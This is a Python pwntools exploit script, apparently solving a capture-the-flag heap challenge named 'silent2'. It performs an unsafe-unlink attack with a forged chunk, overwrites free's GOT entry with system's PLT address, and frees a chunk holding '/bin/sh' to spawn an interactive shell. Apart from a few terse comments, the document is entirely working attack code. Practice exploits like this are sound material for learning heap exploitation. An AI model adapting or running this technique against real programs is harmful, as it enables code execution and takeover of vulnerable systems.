from pwn import *

context.log_level = 'debug'

r = process('./silent2')
elf = ELF('./silent2')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

system_plt = elf.plt['system']
print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)
chunklist=0x6020C0

def add(size, content):
  r.sendline('1')
  r.sendline(str(size))
  r.send(content)

def free(index):
  r.sendline('2')
  r.sendline(str(index))

def edit(index, content, unk_602120):
  r.sendline('3')
  r.sendline(str(index))
  r.sendline(content)
  r.sendline(unk_602120)

def exp():
  r.recvuntil('\n\n')
  add(0x80, 'a')  # 0
  add(0x80, 'b')  # 1
  add(0x80, 'b')  # 2
  add(0x80, 'b')  # 3 <-
  add(0x80, 'b')  # 4
  add(0x80, '/bin/sh\x00')  # 5
  free(3)
#  gdb.attach(r)
  free(4) # free 2 small bin size

  # fake chunk: 0x0 0x81 ... 0x80 0x90 (size: 0x80 + 0x90)
  pay = p64(0) + p64(0x81) + p64(chunklist + 0x18 - 0x18) + p64(chunklist + 0x18 - 0x10)
  pay = pay.ljust(0x80, 'x')
  pay += p64(0x80) + p64(0x90)
  add(0x80 + 0x90, pay)  # 6
  free(4) #unlink 3, then chunklist + 0x18 would be rewrited with chunklist+0x18-0x18
  edit(3, p64(free_got), '') # modified chunklist+0x18-0x18 with address of free_got
  # z('b*0x0000000000400B87\nc')
  edit(0, p64(system_plt), '') # modified free_got with system_plt
  free(5)
  r.interactive()


if __name__ == '__main__':
  exp()
